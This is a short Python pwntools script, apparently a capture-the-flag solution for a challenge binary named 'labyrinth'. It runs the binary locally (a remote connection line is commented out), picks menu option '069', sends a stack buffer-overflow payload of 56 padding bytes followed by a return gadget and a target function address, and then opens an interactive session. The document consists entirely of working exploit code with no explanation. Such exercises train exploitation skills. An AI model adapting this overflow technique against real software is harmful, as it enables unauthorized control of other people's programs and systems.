#!/usr/bin/env python
from pwn import *

#io = remote('ip','port)
io = process('./labyrinth')

pntr_addr = 0x00401255
ret_addr = 0x401602

# Craft the payload
payload = b'A' * 56
payload += p64(ret_addr) + p64(pntr_addr)

# send payload
io.sendline(b'069')
io.sendlineafter('>> ', payload)

io.interactive()
